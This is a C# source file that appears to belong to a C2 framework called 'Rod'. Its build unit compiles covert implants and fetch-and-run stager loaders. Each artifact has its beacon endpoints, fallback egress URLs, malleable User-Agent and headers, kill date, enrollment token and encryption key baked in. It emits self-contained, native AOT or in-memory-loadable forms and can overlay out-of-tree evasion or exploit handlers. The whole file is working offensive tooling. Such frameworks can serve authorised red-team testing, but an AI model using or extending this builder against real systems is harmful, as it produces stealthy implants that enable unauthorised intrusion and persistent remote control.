using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Text.Json;
using Rod.CoreState;
using Rod.CoreState.Implants;

namespace Rod.BuildPipeline.PayloadBuild;

/// <summary>
/// The real .NET build unit. Drives the reference .NET implant's
/// toolchain to compile a per-implant artifact in the requested form factor
/// (the single-file executable default, its trimmed twin, the native AOT
/// binary, or the in-memory-loadable dll bundle) through the build
/// contract (architecture.md Sec 6). It runs <c>dotnet publish</c> against the
/// implant source tree, baking the per-implant profile into a generated
/// <c>BakedProfile.g.cs</c> source file so each artifact carries its own endpoint,
/// contact mode, beacon parameters, and kill date (architecture.md Sec 5.1).
/// The implant's identity is never build-time material: the keypair it
/// generates at first run, bound by the CA at enroll (architecture.md Sec 9).
/// The one symmetric key a build does mint is the transport envelope key
/// (Sec 7/8) -- it seals the enroll and contact bodies, not identity, and it
/// is per-artifact and revocable with the payload it is recorded beside.
///
/// The teamserver is coupled to this unit only by the build contract: it sends
/// <see cref="BuildParams"/> and gets a <see cref="BuildArtifact"/> back, and the
/// .NET toolchain lives entirely on the build-unit side. The unit throws a clear
/// error when <c>dotnet</c> is missing or the build fails, so the build endpoint
/// maps that to a 5xx rather than a silent stub.
/// </summary>
public sealed class DotNetBuildUnit : IBuildUnit
{
    // The implant source tree, relative to the build-pipeline project, that this
    // unit compiles. Overridable via the constructor so tests can point at a
    // fixture or skip a real build. The default walks up from the assembly to find
    // the repo root and lands at <root>/src/implant/dotnet (the tree added with ).
    private readonly string _implantSourceDir;

    // The stage-1 stager tree this unit compiles for stager-class builds
    // (architecture.md Sec 6): <repo>/src/stager/dotnet, the minimal
    // fetch-and-run loader. Same override story as the implant tree.
    private readonly string _stagerSourceDir;

    // The optional out-of-tree extension directory the tradecraft extension kit
    // overlays onto the per-build staging copy (architecture.md Sec 5.3,
    // extending/tradecraft.md): its .cs sources and the generated
    // registrations compile into every implant-class build. Null -- the default
    // and every host that does not configure Build:ImplantExtensionDirectory --
    // means the checked-in empty ExtensionRegistrations stub rides along
    // unchanged. The stager tree is never overlaid: a stage-1 loader carries no
    // tradecraft handlers.
    private readonly string? _extensionDir;
    private readonly string _dotnetBinary;

    public Language Language => Language.DotNet;

    /// <summary>
    /// Builds a .NET build unit. <paramref name="implantSourceDir"/> is the implant
    /// tree to compile (the one containing the .csproj and Program.cs); defaults
    /// to <c>&lt;repo&gt;/src/implant/dotnet</c>. <paramref name="stagerSourceDir"/> is
    /// the stage-1 loader tree stager-class builds compile; defaults to
    /// <c>&lt;repo&gt;/src/stager/dotnet</c>. <paramref name="dotnetBinary"/> is the
    /// dotnet executable, defaulting to PATH resolution of <c>dotnet</c>.
    /// <paramref name="extensionDir"/> is the out-of-tree extension directory whose
    /// handler sources overlay onto every implant-class build; null keeps the
    /// reference tree as-is.
    /// </summary>
    public DotNetBuildUnit(
        string? implantSourceDir = null,
        string? stagerSourceDir = null,
        string? dotnetBinary = null,
        string? extensionDir = null)
    {
        // Whitespace-is-absent on both source dirs, the same rule as the
        // extension dir: a configured-but-empty string is the unset shape, so
        // an installed teamserver naming only one tree still resolves the
        // other from the repo walk-up.
        _implantSourceDir = string.IsNullOrWhiteSpace(implantSourceDir)
            ? ResolveDefaultImplantSourceDir()
            : implantSourceDir;
        _stagerSourceDir = string.IsNullOrWhiteSpace(stagerSourceDir)
            ? ResolveDefaultStagerSourceDir()
            : stagerSourceDir;
        _dotnetBinary = dotnetBinary ?? "dotnet";
        // A present-but-empty extension directory is the unset shape (the
        // shipped appsettings carries Build:ImplantExtensionDirectory as ""),
        // the same whitespace-is-absent rule the host applies when it guards
        // startup; normalizing here keeps every caller from having to.
        _extensionDir = string.IsNullOrWhiteSpace(extensionDir) ? null : extensionDir;
    }

    public async Task<BuildArtifact> BuildAsync(BuildParams @params, CancellationToken cancellationToken = default)
    {
        // The output class picks the tree (architecture.md Sec 6): every class
        // but the stager compiles the reference implant; the stager compiles
        // the stage-1 loader with its own, much smaller baked profile.
        var isStager = @params.Class == ImplantClass.Stager;
        var sourceDir = isStager ? _stagerSourceDir : _implantSourceDir;
        var component = isStager ? "stager" : "implant";
        if (!Directory.Exists(sourceDir))
            throw new InvalidOperationException(
                $".NET {component} source tree not found at '{sourceDir}'.");
        if (isStager && @params.Stage2 is null)
            throw new InvalidOperationException(
                "A stager build requires a stage-2 payload reference (BuildParams.Stage2).");

        // The requested form decides the toolchain shape (architecture.md
        // Sec 6): the executable forms map the requested OS/arch onto a
        // runtime identifier and bundle a runtime so no .NET has to be
        // installed on the target (the practical deployment shape -- a
        // target with a shared .NET on it is a rarity, not the rule); the
        // dll bundle is AnyCPU framework-dependent output -- a host with a
        // .NET runtime loads it in-process, so it maps no pair at all.
        var rid = @params.Format == ArtifactFormat.Dll ? null : MapRid(@params.Target);

        var now = DateTimeOffset.UtcNow;
        var baked = isStager ? RenderStagerProfile(@params) : RenderBakedProfile(@params);

        // A unique temp work dir per build that mirrors the component's relative
        // layout in the repo: <work>/src/<component>/<name> resolves CPM and the
        // shared build props from <work>, and the implant additionally references
        // <work>/src/teamserver/Rod.Protocol/protos/rod.proto via a relative
        // path. Copying that structure keeps the build hermetic -- the real
        // source tree is never mutated and two concurrent builds never step on
        // each other.
        var workDir = Path.Combine(Path.GetTempPath(), "rod-dotnet-build-" + Guid.NewGuid().ToString("N"));
        var stagingDir = Path.Combine(workDir, "src", isStager ? "stager" : "implant", "dotnet");
        var outputDir = Path.Combine(workDir, "out");
        try
        {
            CopyTree(sourceDir, stagingDir);

            // Reproduce the relative layout the csproj assumes: the implant's
            // proto is at <work>/src/teamserver/Rod.Protocol/protos/rod.proto
            // (referenced as ../../teamserver/... from the implant dir); CPM and
            // the shared props sit at <work>/ for both trees. The stager
            // references nothing outside its own tree.
            if (!isStager)
                CopyProtoTree(sourceDir, workDir);
            CopyRepoProps(sourceDir, workDir);

            // The dll bundle targets net8.0 -- the oldest TFM every supported
            // host runtime loads. The global-property route
            // (-p:TargetFramework) never reaches publish's implicit restore
            // (NETSDK1005: the assets keep the shared props' net10.0), so the
            // staging copy's own props carry the retarget -- the same
            // generated-file mechanism the baked profile uses.
            if (@params.Format == ArtifactFormat.Dll)
                RetargetStagingProps(workDir, "net8.0");

            // Overwrite the checked-in BakedProfile stub with the per-build profile.
            // The committed stub compiles empty so the component runs from flags/env
            // during development; the build unit replaces it with the real profile
            // here, in the copy, leaving the source of truth untouched.
            var bakedPath = Path.Combine(stagingDir, "BakedProfile.cs");
            await File.WriteAllTextAsync(
                bakedPath,
                RenderBakedSource(baked, isStager ? "Rod.Stager" : "Rod.Implant"),
                cancellationToken);

            // The extension overlay (the implant half of the tradecraft
            // extension kit, extending/tradecraft.md): a configured directory's
            // handler sources drop onto the staging copy and the generated
            // registrations replace the checked-in empty ExtensionRegistrations
            // stub, so every implant-class build carries the out-of-tree
            // handlers without a fork of the implant tree. Implant builds
            // only -- the stager is a minimal loader that carries no
            // tradecraft handlers. A missing directory or one with no handler
            // fails the build loudly here. The verb decision rides along: a
            // handler whose verb the build class withholds stays out of the
            // compilation whole (the handler trim's rule), while the ungated
            // contract verbs and any verb the class table does not know ride
            // every build.
            if (!isStager && _extensionDir is not null)
                ImplantExtensionOverlay.Apply(
                    _extensionDir,
                    stagingDir,
                    verb => HandlerModuleSelection.CompilesVerb(@params.Class, verb));

            // The bake-time transport trim (architecture.md Sec 8): the baked
            // egress walk's URL shapes decide which contact modules compile,
            // so an artifact carries exactly the transports it can dial and
            // nothing else -- a web-shaped build links no gRPC client at all.
            // The stager is never trimmed: it carries no contact clients.
            var modules = ContactModules.None;
            if (!isStager)
            {
                modules = TransportModuleSelection.Select(@params.Transport, @params.Beacon.Mode);
                TransportModuleSelection.Apply(stagingDir, modules);
            }

            // The bake-time handler trim (architecture.md Sec 5.2/5.3): the
            // class's verb set decides which handler sources compile, so a
            // reduced class is a genuinely reduced binary -- the code for
            // capabilities the artifact will never run neither links nor
            // ships. The stager is never trimmed: it carries no handlers.
            if (!isStager)
                HandlerModuleSelection.Apply(stagingDir, HandlerModuleSelection.Select(@params.Class));

            // The format axis (architecture.md Sec 6): every form is one
            // dotnet publish invocation with its own shape. The single-file
            // default bundles the runtime (compression trades a slower cold
            // start for a much smaller artifact worth transferring); the
            // trimmed twin adds IL trimming for a materially smaller bundle;
            // native AOT compiles ahead of time to a runtime-free native
            // binary; the dll bundle publishes framework-dependent against
            // net8.0 -- the oldest TFM every supported host runtime loads,
            // so a pwsh 7.4 (LTS, .NET 8) host and this teamserver's own
            // .NET 10 both load the same bytes.
            var publishArgs = new List<string>
            {
                "publish",
                "-c", "Release",
            };
            if (rid is not null)
                publishArgs.AddRange(new[] { "-r", rid });
            switch (@params.Format)
            {
                case ArtifactFormat.TrimmedExe:
                    publishArgs.AddRange(new[]
                    {
                        "--self-contained", "true",
                        "-p:PublishSingleFile=true",
                        "-p:EnableCompressionInSingleFile=true",
                        "-p:PublishTrimmed=true",
                    });
                    break;
                case ArtifactFormat.NativeAot:
                    publishArgs.AddRange(new[]
                    {
                        "--self-contained", "true",
                        "-p:PublishAot=true",
                    });
                    break;
                case ArtifactFormat.Dll:
                    publishArgs.AddRange(new[]
                    {
                        "--self-contained", "false",
                    });
                    break;
                default:
                    publishArgs.AddRange(new[]
                    {
                        "--self-contained", "true",
                        "-p:PublishSingleFile=true",
                        "-p:EnableCompressionInSingleFile=true",
                    });
                    break;
            }
            publishArgs.AddRange(new[] { "-o", outputDir, "--nologo", "/clp:NoSummary" });
            // The trim's compile half: with no stream module the implant csproj
            // generates the rod.v1 message types only and drops the
            // Grpc.Net.Client reference (its RodGrpcServices switch).
            if (!isStager && !TransportModuleSelection.NeedsGrpcClient(modules))
                publishArgs.Add("-p:RodGrpcServices=None");
            var result = await RunDotNetAsync(publishArgs.ToArray(), stagingDir, cancellationToken);

            if (result.ExitCode != 0)
            {
                // dotnet writes build errors to stdout, not stderr, so the
                // diagnostic combines both streams -- whichever carries the
                // failure cause is what the operator sees.
                var diag = result.Stdout;
                if (result.Stderr.Length > 0)
                    diag = (diag.Length > 0 ? diag + "\n" : "") + result.Stderr;
                throw new InvalidOperationException(
                    $"dotnet publish failed (exit {result.ExitCode}):\n{diag}");
            }

            // The artifact is the format's output. The executable forms pick
            // the native single file (a Windows target gets .exe, everything
            // else the extensionless binary); the dll form packs the
            // framework-dependent publish output into the one zip a host
            // fetches and loads in-process.
            byte[] content;
            string contentType;
            if (@params.Format == ArtifactFormat.Dll)
            {
                var entryDll = (isStager ? "Rod.Stager.dll" : "Rod.Implant.dll");
                if (!File.Exists(Path.Combine(outputDir, entryDll)))
                    throw new InvalidOperationException(
                        $"dotnet publish reported success but produced no {entryDll}.");
                content = await ZipDllOutputAsync(outputDir, cancellationToken);
                contentType = "application/zip";
            }
            else
            {
                var exeName = rid!.StartsWith("win", StringComparison.Ordinal)
                    ? (isStager ? "Rod.Stager.exe" : "Rod.Implant.exe")
                    : (isStager ? "Rod.Stager" : "Rod.Implant");
                var exePath = Path.Combine(outputDir, exeName);
                if (!File.Exists(exePath))
                    throw new InvalidOperationException(
                        $"dotnet publish reported success but produced no {exeName}.");
                content = await File.ReadAllBytesAsync(exePath, cancellationToken);
                contentType = "application/octet-stream";
            }
            return BuildArtifact.Of(
                Language,
                artifactId: Guid.NewGuid(),
                @params,
                content,
                contentType: contentType,
                builtAt: now);
        }
        finally
        {
            TryCleanup(workDir);
        }
    }

    // Retargets the work-dir copy of the shared build props to a different
    // framework: a one-line swap of the pinned TargetFramework, so the staging
    // tree restores, compiles, and publishes against it. Fails loudly when the
    // copy is missing or does not pin the expected line -- a dll build that
    // silently compiled net10.0 would produce a bundle no .NET 8 host loads.
    private static void RetargetStagingProps(string workDir, string targetFramework)
    {
        var propsPath = Path.Combine(workDir, "Directory.Build.props");
        if (!File.Exists(propsPath))
            throw new InvalidOperationException(
                "The dll format needs the shared build props in the staging copy; the repo walk-up found none.");
        var text = File.ReadAllText(propsPath);
        var retargeted = text.Replace(
            "<TargetFramework>net10.0</TargetFramework>",
            $"<TargetFramework>{targetFramework}</TargetFramework>");
        if (retargeted == text)
            throw new InvalidOperationException(
                $"The shared build props do not pin net10.0; cannot retarget the staging copy to {targetFramework}.");
        File.WriteAllText(propsPath, retargeted);
    }

    // Packs the framework-dependent publish output into the single zip a host
    // fetches and loads in-process: the entry assembly, its dependency
    // assemblies, and the deps/runtimeconfig files, sorted by name so the
    // entry order is stable. The native apphost and symbols stay out -- a
    // host loading bytes has no use for either.
    private static async Task<byte[]> ZipDllOutputAsync(string outputDir, CancellationToken cancellationToken)
    {
        using var stream = new MemoryStream();
        using (var archive = new System.IO.Compression.ZipArchive(stream, System.IO.Compression.ZipArchiveMode.Create, leaveOpen: true))
        {
            foreach (var file in Directory.EnumerateFiles(outputDir)
                         .OrderBy(f => Path.GetFileName(f), StringComparer.Ordinal))
            {
                var fileName = Path.GetFileName(file);
                if (!fileName.EndsWith(".dll", StringComparison.OrdinalIgnoreCase)
                    && !fileName.EndsWith(".json", StringComparison.OrdinalIgnoreCase))
                    continue;
                var entry = archive.CreateEntry(fileName, System.IO.Compression.CompressionLevel.Optimal);
                await using var entryStream = entry.Open();
                await using var source = File.OpenRead(file);
                await source.CopyToAsync(entryStream, cancellationToken);
            }
        }
        return stream.ToArray();
    }

    // Maps a build target onto a .NET runtime identifier. The contract speaks
    // Go-style os/arch pairs (linux/amd64); dotnet speaks RIDs (linux-x64). The
    // accepted arch aliases cover the spellings operators actually send; anything
    // else fails with the supported set named so the request is fixable.
    public static string MapRid(TargetProfile target)
    {
        var os = target.OperatingSystem.Trim().ToLowerInvariant();
        var arch = target.Architecture.Trim().ToLowerInvariant();
        var ridArch = arch switch
        {
            "amd64" or "x64" or "x86_64" => "x64",
            "x86" or "386" => "x86",
            "arm64" or "aarch64" => "arm64",
            _ => throw new InvalidOperationException(
                $"Unsupported target architecture '{target.Architecture}' for the .NET build unit " +
                "(supported: amd64/x64, x86/386, arm64/aarch64)."),
        };
        return os switch
        {
            "linux" => $"linux-{ridArch}",
            "windows" or "win" => $"win-{ridArch}",
            "osx" or "darwin" or "macos" => $"osx-{ridArch}",
            _ => throw new InvalidOperationException(
                $"Unsupported target OS '{target.OperatingSystem}' for the .NET build unit " +
                "(supported: linux, windows, osx)."),
        };
    }

    // Renders the baked profile as a compact JSON map, base64-url-encoded without
    // padding so it is safe to embed verbatim in a C# string literal. This shape
    // is the language-neutral wire contract: any build unit -- a community
    // Go/C/Nim unit out-of-tree, or this in-tree .NET unit -- must emit the same
    // keys and encoding so an implant of any language decodes the same profile.
    // The key set is exactly what the reference implant consumes (its
    // BakedProfileSupport maps each key), plus the baked verb set (the class's
    // reduced set plus the ungated contract-only verbs), which the implant-side
    // capability derivation reads (architecture.md Sec 5.3).
    // No key material is baked at all: the implant reads its key from the
    // teamserver at enroll time, not from the baked profile (architecture.md
    // Sec 7).
    public static string RenderBakedProfile(BuildParams @params)
    {
        // The class's reduced verb set (architecture.md Sec 5.2) plus the
        // contract-only verbs no class gates (Sec 5.2/10.2), comma-joined so the
        // artifact is self-describing: the generated implant carries the verbs it
        // is permitted to run, baked in alongside its profile. The ungated
        // contract verbs ride along so an artifact compiled with an out-of-tree
        // evasion or exploit handler advertises the verb at handshake; the
        // advertised set is still intersected with the compiled handlers, so an
        // artifact without the handler never claims them.
        var verbs = string.Join(",", ImplantClassCapabilities.For(@params.Class)
            .Concat(ImplantClassCapabilities.Ungated));
        // The malleable transport profile (architecture.md Sec 7): the enroll
        // path, User-Agent, custom headers, request timeout, and body envelope
        // that shape the wire so two implants do not look the same. Headers ride
        // as a nested JSON object (an empty profile emits {}) and the envelope is
        // the lowercase enum name. Header object keys are sorted for stable byte
        // output so the baked profile matches the wire-contract shape across build
        // units. The ordered fallback egress endpoints (Sec 8) ride as a JSON
        // array behind the primary -- [] when the build names none -- so every
        // build unit emits the same key set and an implant of any language walks
        // the same list.
        var map = new Dictionary<string, object>
        {
            ["enrollURL"] = @params.Transport.Endpoint,
            // The beacon host is the enroll host (the single-front shape)
            // unless the build names a split -- enroll on one socket, the
            // gRPC beacon on another (architecture.md Sec 8).
            ["beaconURL"] = @params.Transport.BeaconEndpoint
                ?? BeaconUrlFromEnroll(@params.Transport.Endpoint),
            // The pinned teamserver CA: the enroll client validates the
            // server it dials against this anchor (the C2's own CA is in no
            // system store). Empty keeps system/default validation.
            ["caCert"] = @params.Transport.CaPem ?? "",
            ["fallbackEnrollURLs"] = @params.Transport.FallbackEndpoints.ToArray(),
            ["mode"] = @params.Beacon.Mode,
            // Empty string is the open-ended shape: the loader reads a missing
            // or empty kill date as "no fuse" and never self-terminates.
            ["killDate"] = @params.Beacon.KillDate?.ToString("O") ?? "",
            ["sleep"] = ((long)@params.Beacon.Sleep.TotalSeconds).ToString() + "s",
            ["jitter"] = ((long)@params.Beacon.Jitter.TotalSeconds).ToString() + "s",
            ["enrollPath"] = @params.Transport.EnrollPath,
            ["userAgent"] = @params.Transport.UserAgent,
            ["headers"] = RenderHeadersMap(@params.Transport.Headers),
            ["requestTimeout"] = ((long)@params.Transport.RequestTimeout.TotalSeconds).ToString() + "s",
            ["envelope"] = @params.Transport.Envelope.ToString().ToLowerInvariant(),
            // Contact protection (architecture.md Sec 8/9), its own knob
            // beside the enroll-body envelope: "aesgcm" seals every contact
            // body under the baked key, "none" is the lab-debug plaintext
            // frame. The key must actually ride the params -- a protection
            // ask with no key never bakes a seal the artifact cannot honor.
            ["contactEnvelope"] = @params.Transport.ContactProtection && @params.EnvelopeKey is not null
                ? "aesgcm"
                : "none",
            ["verbs"] = verbs,
        };
        // The AES-GCM envelope key, when the profile asked for the encrypted
        // envelope: one base64 value carrying the key id and the key, baked the
        // same way on every build unit so the implant-side decode is uniform.
        // Omitted entirely when absent, so a plaintext-envelope build bakes the
        // same profile it always did.
        if (@params.EnvelopeKeyId is { } envelopeKeyId && @params.EnvelopeKey is { } envelopeKey)
            map["envelopeKey"] = Convert.ToBase64String(envelopeKeyId.ToByteArray().Concat(envelopeKey).ToArray());
        // The enrollment credential, when the build was minted one: the
        // artifact deploys with zero run-time arguments and spends the token
        // at its own enroll. Omitted entirely when absent, so a
        // credential-free build bakes the same profile it always did.
        if (@params.TokenSecret is { } tokenSecret)
            map["token"] = tokenSecret;
        var json = JsonSerializer.Serialize(map);
        return Base64Url.Encode(Encoding.UTF8.GetBytes(json));
    }

    // Renders the profile's custom headers as a JSON-object value (a
    // Dictionary<string,string>, {} when empty) with keys sorted so the baked
    // profile's byte output is stable across builds regardless of the runtime's
    // dictionary iteration order.
    private static Dictionary<string, string> RenderHeadersMap(IReadOnlyDictionary<string, string> headers)
    {
        var ordered = new Dictionary<string, string>(StringComparer.Ordinal);
        foreach (var key in headers.Keys.OrderBy(k => k, StringComparer.Ordinal))
            ordered[key] = headers[key];
        return ordered;
    }

    // Renders the stage-1 stager's baked profile (architecture.md Sec 6): the
    // loader consumes a much smaller key set than the implant -- the enroll
    // listener it fetches its stage-2 from, the payload id and its sha256 (the
    // fetch's integrity anchor, the same fingerprint the operator saw at build
    // time), and the kill date the loader refuses to run past. Same base64url
    // JSON shape as the implant's profile, so every build unit emits one
    // encoding and a loader of any language decodes the same way.
    public static string RenderStagerProfile(BuildParams @params)
    {
        if (@params.Class != ImplantClass.Stager)
            throw new InvalidOperationException("A stager profile is only rendered for the stager class.");
        if (@params.Stage2 is null)
            throw new InvalidOperationException("A stager build requires a stage-2 payload reference.");

        var map = new Dictionary<string, object>
        {
            ["enrollURL"] = @params.Transport.Endpoint,
            ["stage2PayloadId"] = @params.Stage2.PayloadId.ToString(),
            ["stage2Sha256"] = @params.Stage2.Sha256,
            // Empty string is the open-ended shape, same as the implant profile.
            ["killDate"] = @params.Beacon.KillDate?.ToString("O") ?? "",
        };
        // The stager presents its own baked token for the fetch; the stage-2
        // it launches enrolls on the token baked into the stage-2's own
        // profile.
        if (@params.TokenSecret is { } tokenSecret)
            map["token"] = tokenSecret;
        var json = JsonSerializer.Serialize(map);
        return Base64Url.Encode(Encoding.UTF8.GetBytes(json));
    }

    // Materializes the generated BakedProfile.cs source from a baked profile. The
    // file replaces the checked-in stub in the per-build copy of the source tree;
    // the component's Program reads BakedProfile.Json and decodes the base64url
    // JSON. The namespace differs per tree (Rod.Implant, Rod.Stager), so it is a
    // parameter.
    private static string RenderBakedSource(string base64UrlProfile, string bakedNamespace)
    {
        // The profile is embedded as a verbatim C# string literal. base64url
        // (A-Za-z0-9-_) contains no characters that need escaping in a verbatim
        // string, so the literal is exactly the encoded value.
        return "// <auto-generated> Generated by Rod.DotNetBuildUnit at build time.\n"
            + "// The per-artifact profile, baked in at generation (architecture.md Sec 5.1).\n"
            + "namespace " + bakedNamespace + ";\n\n"
            + "internal static class BakedProfile\n"
            + "{\n"
            + "    public const string Json = \"" + base64UrlProfile + "\";\n"
            + "}\n";
    }

    // The beacon URL is the enroll endpoint with /implants/enroll stripped. The
    // build params carry a single endpoint; the implant accepts an explicit beacon
    // URL when enroll and beacon hosts differ (a redirector in front). Mirrors the
    // Go build unit. Internal: the transport module selection derives the same
    // walk entries when it classifies which contact modules a build compiles.
    internal static string BeaconUrlFromEnroll(string enrollEndpoint)
    {
        const string suffix = "/implants/enroll";
        if (enrollEndpoint.EndsWith(suffix, StringComparison.OrdinalIgnoreCase))
            return enrollEndpoint[..^suffix.Length];
        return enrollEndpoint;
    }

    // Recursively copies a directory tree, skipping bin/obj and any prior build
    // output so a stale publish never leaks into the build. The implant source
    // tree is small (a handful of .cs files plus the csproj and proto reference),
    // so a full copy is cheap and keeps the real source tree untouched.
    private static void CopyTree(string source, string destination)
    {
        Directory.CreateDirectory(destination);
        foreach (var entry in Directory.EnumerateFileSystemEntries(source))
        {
            var name = Path.GetFileName(entry);
            if (name is "bin" or "obj")
                continue;
            var target = Path.Combine(destination, name);
            if (Directory.Exists(entry))
                CopyTree(entry, target);
            else
                File.Copy(entry, target, overwrite: true);
        }
    }

    // Walks up from the implant source tree to the repo root: the directory
    // holding both src/ and tests/. Used to locate the shared MSBuild props and
    // the teamserver proto the implant builds against, regardless of how deep
    // the implant sits under src/.
    private static DirectoryInfo? FindRepoRoot(DirectoryInfo start)
    {
        DirectoryInfo? dir = start;
        while (dir is not null)
        {
            if (Directory.Exists(Path.Combine(dir.FullName, "src"))
                && Directory.Exists(Path.Combine(dir.FullName, "tests")))
                return dir;
            dir = dir.Parent;
        }
        return null;
    }

    // Copies the repo-root MSBuild props (Directory.Build.props and
    // Directory.Packages.props) and the SDK pin (global.json) into the work dir
    // so the staging copy of the implant resolves CPM, the shared build settings,
    // and the pinned SDK the same way it does in the real tree. The implant's
    // csproj walks up from its dir to find these, so they must sit one level
    // above the staging copy. If a file is absent (e.g. an older tree), it is
    // skipped rather than failing.
    private static void CopyRepoProps(string implantSourceDir, string workDir)
    {
        // The shared props sit at the repo root: the directory holding both src/
        // and tests/, found by walking up from the implant tree.
        var repoRoot = FindRepoRoot(new DirectoryInfo(implantSourceDir))?.FullName;
        if (repoRoot is null || !Directory.Exists(repoRoot))
            return;
        foreach (var name in new[] { "Directory.Build.props", "Directory.Packages.props", "global.json" })
        {
            var src = Path.Combine(repoRoot, name);
            if (File.Exists(src))
                File.Copy(src, Path.Combine(workDir, name), overwrite: true);
        }
    }

    // Copies the teamserver proto tree (src/teamserver/Rod.Protocol/protos/) into
    // the work dir under the same relative path the implant's csproj references
    // it by (../../teamserver/Rod.Protocol/protos/ from the implant dir). The
    // proto is the single source of truth for the wire contract and is
    // referenced, not copied, by the csproj -- so the build needs the same
    // relative layout to find it. rod.proto has no imports, so only it (and its
    // protos/ dir) is needed.
    private static void CopyProtoTree(string implantSourceDir, string workDir)
    {
        var repoRoot = FindRepoRoot(new DirectoryInfo(implantSourceDir))?.FullName;
        if (repoRoot is null || !Directory.Exists(repoRoot))
            return;
        var protoSrcDir = Path.Combine(repoRoot, "src", "teamserver", "Rod.Protocol", "protos");
        if (!Directory.Exists(protoSrcDir))
            return;
        var protoDstDir = Path.Combine(workDir, "src", "teamserver", "Rod.Protocol", "protos");
        Directory.CreateDirectory(protoDstDir);
        foreach (var file in Directory.EnumerateFiles(protoSrcDir))
            File.Copy(file, Path.Combine(protoDstDir, Path.GetFileName(file)), overwrite: true);
    }

    // Runs dotnet with the given arguments, from the implant source directory,
    // capturing stdout and stderr for the error message on failure (dotnet writes
    // build errors to stdout). Reads both to completion after the process exits so
    // the captured text is never truncated by an async-read race.
    private async Task<(int ExitCode, string Stdout, string Stderr)> RunDotNetAsync(
        string[] args, string workingDirectory, CancellationToken cancellationToken)
    {
        var psi = new ProcessStartInfo
        {
            FileName = _dotnetBinary,
            WorkingDirectory = workingDirectory,
            UseShellExecute = false,
            RedirectStandardError = true,
            RedirectStandardOutput = true,
        };
        foreach (var arg in args)
            psi.ArgumentList.Add(arg);
        // Isolate the NuGet package cache and the build output from the runner's
        // environment so two concurrent builds never race, and so the build is
        // reproducible regardless of the host's NUGET_PACKAGES layout.
        psi.Environment["NUGET_PACKAGES"] = Path.Combine(Path.GetTempPath(), "rod-dotnet-nuget");
        // Quiet the SDK's telemetry and first-time-experience prompts in CI/headless.
        psi.Environment["DOTNET_CLI_TELEMETRY_OPTOUT"] = "1";
        psi.Environment["DOTNET_NOLOGO"] = "1";
        psi.Environment["DOTNET_SKIP_FIRST_TIME_EXPERIENCE"] = "1";

        using var process = new Process { StartInfo = psi };
        if (!process.Start())
            throw new InvalidOperationException($"Failed to start dotnet ('{_dotnetBinary}').");

        // Read both streams fully on background tasks so a full pipe cannot block
        // the build, and so the text is complete by the time we read it after exit.
        var stdoutTask = process.StandardOutput.ReadToEndAsync(cancellationToken);
        var stderrTask = process.StandardError.ReadToEndAsync(cancellationToken);

        try
        {
            await process.WaitForExitAsync(cancellationToken);
        }
        catch (OperationCanceledException)
        {
            try { process.Kill(entireProcessTree: true); } catch { }
            throw;
        }

        var stdout = await stdoutTask;
        var stderr = await stderrTask;
        return (process.ExitCode, stdout, stderr);
    }

    // The default implant tree is <repo>/src/implant/dotnet, found by walking up
    // from this assembly to the repo root -- the directory holding src/implant/
    // dotnet alongside src/teamserver. Keeps the build unit independent of the
    // working directory it is invoked from.
    private static string ResolveDefaultImplantSourceDir()
    {
        var dir = new DirectoryInfo(AppContext.BaseDirectory);
        while (dir is not null)
        {
            if (Directory.Exists(Path.Combine(dir.FullName, "src", "implant", "dotnet"))
                && Directory.Exists(Path.Combine(dir.FullName, "src", "teamserver")))
                return Path.Combine(dir.FullName, "src", "implant", "dotnet");
            dir = dir.Parent;
        }
        // Fall back to a relative path so the error message in BuildAsync is clear.
        return Path.Combine("..", "..", "..", "..", "..", "src", "implant", "dotnet");
    }

    // The stager twin of the implant resolver: <repo>/src/stager/dotnet under
    // the same repo root.
    private static string ResolveDefaultStagerSourceDir()
    {
        var dir = new DirectoryInfo(AppContext.BaseDirectory);
        while (dir is not null)
        {
            if (Directory.Exists(Path.Combine(dir.FullName, "src", "stager", "dotnet"))
                && Directory.Exists(Path.Combine(dir.FullName, "src", "teamserver")))
                return Path.Combine(dir.FullName, "src", "stager", "dotnet");
            dir = dir.Parent;
        }
        return Path.Combine("..", "..", "..", "..", "..", "src", "stager", "dotnet");
    }

    private static void TryCleanup(string path)
    {
        try { Directory.Delete(path, recursive: true); }
        catch { /* best-effort; temp dir is disposable */ }
    }

}
